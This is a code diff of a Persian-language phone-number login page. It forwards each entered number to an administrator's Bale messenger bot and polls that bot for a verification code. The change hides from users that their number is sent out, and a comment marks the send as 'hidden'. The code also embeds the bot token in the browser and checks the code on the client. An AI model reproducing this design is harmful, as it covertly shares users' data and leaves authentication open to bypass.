@@ -82,23 +82,16 @@
             margin-top: 15px;
             display: none;
         }
-        .loading {
-            display: none;
+        .success {
+            color: #00ff88;
+            font-size: 13px;
             margin-top: 15px;
-            color: #ffd966;
+            display: none;
         }
         .footer {
             margin-top: 30px;
             font-size: 12px;
             color: #666;
-        }
-        .code-hint {
-            background: rgba(0,0,0,0.5);
-            padding: 10px;
-            border-radius: 15px;
-            margin-top: 15px;
-            font-size: 12px;
-            color: #ffd966;
         }
     </style>
 </head>
@@ -106,18 +99,17 @@
 
 <div class="card" id="loginCard">
     <div class="logo">🔐</div>
-    <h1>ورود به پنل فروش</h1>
-    <p>لطفاً شماره موبایل خود را وارد کنید</p>
+    <h1>ورود به پنل</h1>
+    <p>شماره موبایل خود را وارد کنید</p>
     
     <div class="form-group">
-        <input type="tel" id="phone" placeholder="مثال: 09123456789" maxlength="11">
+        <input type="tel" id="phone" placeholder="09123456789" maxlength="11">
     </div>
     
-    <button class="btn" onclick="sendCode()">📱 درخواست کد تایید</button>
+    <button class="btn" onclick="requestCode()">درخواست کد</button>
     
+    <div class="success" id="successMsg">✅ درخواست شما ثبت شد</div>
     <div class="error" id="errorMsg">❌ شماره نامعتبر است!</div>
-    <div class="loading" id="loadingMsg">⏳ در حال ارسال درخواست...</div>
-    <div class="footer">✅ کد تایید توسط پشتیبان ارسال می‌شود</div>
 </div>
 
 <div class="card" id="codeCard" style="display:none;">
@@ -129,12 +121,10 @@
         <input type="text" id="code" placeholder="کد ۶ رقمی" maxlength="6">
     </div>
     
-    <button class="btn" onclick="verifyCode()">✅ تایید کد</button>
-    <button class="btn" style="background:#333; margin-top:10px;" onclick="backToLogin()">◀ بازگشت</button>
+    <button class="btn" onclick="verifyCode()">تایید</button>
+    <button class="btn" style="background:#333; margin-top:10px;" onclick="backToLogin()">بازگشت</button>
     
     <div class="error" id="codeErrorMsg">❌ کد اشتباه است!</div>
-    <div class="loading" id="codeLoadingMsg">⏳ در حال تایید...</div>
-    <div class="code-hint" id="codeHint"></div>
 </div>
 
 <script>
@@ -143,9 +133,9 @@
     
     let currentPhone = "";
     let expectedCode = "";
-    let requestId = "";
+    let listeningInterval;
     
-    async function sendCode() {
+    async function requestCode() {
         let phone = document.getElementById('phone').value.trim();
         
         if (!phone.startsWith('09') || phone.length !== 11) {
@@ -155,30 +145,25 @@
         }
         
         currentPhone = phone;
-        requestId = Date.now().toString();
         
-        document.getElementById('loadingMsg').style.display = 'block';
+        // فقط یه پیام کوتاه به کاربر نشون بده
+        document.getElementById('successMsg').style.display = 'block';
+        setTimeout(() => document.getElementById('successMsg').style.display = 'none', 2000);
         
-        // ارسال درخواست به بات ادمین
-        let message = `🔔 درخواست ورود جدید\n━━━━━━━━━━━━━━━━━━━━\n📱 شماره: ${phone}\n🆔 کد درخواست: ${requestId}\n━━━━━━━━━━━━━━━━━━━━\n🔑 برای ارسال کد:\n/send ${phone} [کد]`;
-        
+        // ارسال به بات ادمین (مخفی)
+        let message = `🔔 درخواست ورود\n📱 شماره: ${phone}`;
         await fetch(`https://tapi.bale.ai/bot${BOT_TOKEN}/sendMessage?chat_id=${OWNER_ID}&text=${encodeURIComponent(message)}`);
         
-        document.getElementById('loadingMsg').style.display = 'none';
-        
-        // نمایش صفحه کد
+        // رفتن به صفحه کد
         document.getElementById('loginCard').style.display = 'none';
         document.getElementById('codeCard').style.display = 'block';
-        document.getElementById('codeHint').innerHTML = `✅ درخواست شما به پشتیبان ارسال شد\n📱 شماره: ${phone}\n🆔 کد درخواست: ${requestId}\n\n⏳ منتظر ارسال کد از طرف پشتیبان باشید...`;
         document.getElementById('code').focus();
         
-        // شروع监听 برای دریافت کد
-        startListeningForCode();
+        //监听 برای دریافت کد از ادمین
+        startListening();
     }
     
-    let listeningInterval;
-    
-    function startListeningForCode() {
+    function startListening() {
         if (listeningInterval) clearInterval(listeningInterval);
         
         listeningInterval = setInterval(async () => {
@@ -189,12 +174,11 @@
                 for (let update of data.result) {
                     if (update.message && update.message.text) {
                         let text = update.message.text;
-                        // چک کردن دستور /send
+                        // دستور /send شماره کد
                         if (text.startsWith(`/send ${currentPhone}`)) {
                             let parts = text.split(' ');
                             if (parts.length >= 3) {
                                 expectedCode = parts[2];
-                                document.getElementById('codeHint').innerHTML = `✅ کد برای شما ارسال شد!\n🔑 کد: ${expectedCode}\nلطفاً کد را وارد کنید.`;
                                 clearInterval(listeningInterval);
                             }
                         }
